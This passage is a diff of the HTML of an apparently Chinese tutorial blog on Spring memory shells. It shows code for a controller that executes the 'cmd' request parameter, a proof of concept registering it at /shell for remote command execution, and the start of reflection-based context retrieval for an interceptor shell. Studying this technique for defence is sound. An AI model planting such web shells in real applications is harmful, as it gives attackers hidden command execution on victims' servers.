+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
+</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
+</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
+</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
+</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
+</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
+</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
+</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
+</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
+</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
+</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
+</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.web</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="p">;</span><span class="w">
@@ -456,10 +888,87 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">ServletRequestAttributes</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">())).</span><span class="na">getRequest</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">));</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><h4 id="134-完整-poc">1.3.4 完整 POC<a hidden class="anchor" aria-hidden="true" href="#134-完整-poc">#</a></h4>
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h4 id="134-完整-poc">1.3.4 完整 POC<a hidden class="anchor" aria-hidden="true" href="#134-完整-poc">#</a></h4>
 <p>POC 并不唯一，想要复现成功取决于自己的<strong>运行环境</strong>，比如 spring boot 版本问题等，<strong>具体问题具体分析！</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.web</span><span class="p">;</span><span class="w">
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
+</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
+</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
+</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
+</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
+</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
+</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
+</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
+</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
+</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
+</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
+</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
+</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
+</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
+</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
+</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
+</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
+</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
+</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
+</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
+</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
+</span><span class="lnt" id="27"><a class="lnlinks" href="#27">27</a>
+</span><span class="lnt" id="28"><a class="lnlinks" href="#28">28</a>
+</span><span class="lnt" id="29"><a class="lnlinks" href="#29">29</a>
+</span><span class="lnt" id="30"><a class="lnlinks" href="#30">30</a>
+</span><span class="lnt" id="31"><a class="lnlinks" href="#31">31</a>
+</span><span class="lnt" id="32"><a class="lnlinks" href="#32">32</a>
+</span><span class="lnt" id="33"><a class="lnlinks" href="#33">33</a>
+</span><span class="lnt" id="34"><a class="lnlinks" href="#34">34</a>
+</span><span class="lnt" id="35"><a class="lnlinks" href="#35">35</a>
+</span><span class="lnt" id="36"><a class="lnlinks" href="#36">36</a>
+</span><span class="lnt" id="37"><a class="lnlinks" href="#37">37</a>
+</span><span class="lnt" id="38"><a class="lnlinks" href="#38">38</a>
+</span><span class="lnt" id="39"><a class="lnlinks" href="#39">39</a>
+</span><span class="lnt" id="40"><a class="lnlinks" href="#40">40</a>
+</span><span class="lnt" id="41"><a class="lnlinks" href="#41">41</a>
+</span><span class="lnt" id="42"><a class="lnlinks" href="#42">42</a>
+</span><span class="lnt" id="43"><a class="lnlinks" href="#43">43</a>
+</span><span class="lnt" id="44"><a class="lnlinks" href="#44">44</a>
+</span><span class="lnt" id="45"><a class="lnlinks" href="#45">45</a>
+</span><span class="lnt" id="46"><a class="lnlinks" href="#46">46</a>
+</span><span class="lnt" id="47"><a class="lnlinks" href="#47">47</a>
+</span><span class="lnt" id="48"><a class="lnlinks" href="#48">48</a>
+</span><span class="lnt" id="49"><a class="lnlinks" href="#49">49</a>
+</span><span class="lnt" id="50"><a class="lnlinks" href="#50">50</a>
+</span><span class="lnt" id="51"><a class="lnlinks" href="#51">51</a>
+</span><span class="lnt" id="52"><a class="lnlinks" href="#52">52</a>
+</span><span class="lnt" id="53"><a class="lnlinks" href="#53">53</a>
+</span><span class="lnt" id="54"><a class="lnlinks" href="#54">54</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.web</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.stereotype.Controller</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
@@ -512,8 +1021,10 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p>先访问 /control 进行 controller 注册，然后访问 controller 映射路径 /shell，加上参数就可以实现 RCE</p>
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><p>先访问 /control 进行 controller 注册，然后访问 controller 映射路径 /shell，加上参数就可以实现 RCE</p>
 <p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518492.png" style="max-width: 100%; height: auto;">	<img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518947.png" style="max-width: 100%; height: auto;"></p>
 <h4 id="记录问题">记录问题：<a hidden class="anchor" aria-hidden="true" href="#记录问题">#</a></h4>
 <p>环境：</p>
@@ -544,8 +1055,32 @@
 </ul>
 <p><strong>解决方法：</strong></p>
 <p>在 <code>application.properties</code> 或 <code>application.yml</code> 加上：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">spring.mvc.pathmatch.matching-strategy=ant_path_matcher
-</span></span></code></pre></div><p>意思：强制使用旧版的路径解析机制（与 Spring 2.5 以前版本兼容）。</p>
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">plain</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">spring.mvc.pathmatch.matching-strategy=ant_path_matcher</span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><p>意思：强制使用旧版的路径解析机制（与 Spring 2.5 以前版本兼容）。</p>
 <p>适用于目前使用的 Spring Boot 2.6.x。</p>
 <p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520466.png" style="max-width: 100%; height: auto;"></p>
 <p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518085.png" style="max-width: 100%; height: auto;"></p>
@@ -569,7 +1104,54 @@
 </ol>
 <p>由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作</p>
 <h3 id="21-interceptor-创建">2.1 Interceptor 创建<a hidden class="anchor" aria-hidden="true" href="#21-interceptor-创建">#</a></h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.interceptor</span><span class="p">;</span><span class="w">
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
+</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
+</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
+</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
+</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
+</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
+</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
+</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
+</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
+</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
+</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
+</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
+</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
+</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
+</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
+</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
+</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
+</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
+</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
+</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
+</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.interceptor</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.HandlerInterceptor</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
@@ -594,8 +1176,48 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writer</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.controller</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
+</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
+</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
+</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
+</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
+</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
+</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
+</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
+</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
+</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
+</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
+</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.controller</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.GetMapping</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
@@ -611,8 +1233,48 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">data</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Protected Data&#34;</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.config</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
+</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
+</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
+</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
+</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
+</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
+</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
+</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
+</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
+</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
+</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
+</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.config</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.src.springmem.demos.interceptor.LoginInterceptor</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.context.annotation.Configuration</span><span class="p">;</span><span class="w">
@@ -628,8 +1290,10 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">.</span><span class="na">addPathPatterns</span><span class="p">(</span><span class="s">&#34;/**&#34;</span><span class="p">)</span><span class="w">           </span><span class="c1">// 拦截所有路径</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">.</span><span class="na">excludePathPatterns</span><span class="p">(</span><span class="s">&#34;/login&#34;</span><span class="p">);</span><span class="w">   </span><span class="c1">// 放行登录接口</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520006.png" style="max-width: 100%; height: auto;"></p>
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520006.png" style="max-width: 100%; height: auto;"></p>
 <p>访问可通行的路径：</p>
 <p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518686.png" style="max-width: 100%; height: auto;">	<img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518278.png" style="max-width: 100%; height: auto;"></p>
 <h3 id="22-interceptor-流程分析">2.2 Interceptor 流程分析<a hidden class="anchor" aria-hidden="true" href="#22-interceptor-流程分析">#</a></h3>
@@ -656,21 +1320,124 @@
 <h4 id="231-获取上下文">2.3.1 获取上下文<a hidden class="anchor" aria-hidden="true" href="#231-获取上下文">#</a></h4>
 <p>参考 Controller 的获取上下文方式</p>
 <p>这里使用反射获取</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span><span class="w">
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6">6</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">reflect</span><span class="p">.</span><span class="na">Field</span><span class="w"> </span><span class="n">filed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.context.support.LiveBeansView&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;applicationContexts&#34;</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 2. 属性被 private 修饰，所以 setAccessible true</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">filed</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 3. 获取一个 ApplicationContext 实例</span><span class="w">
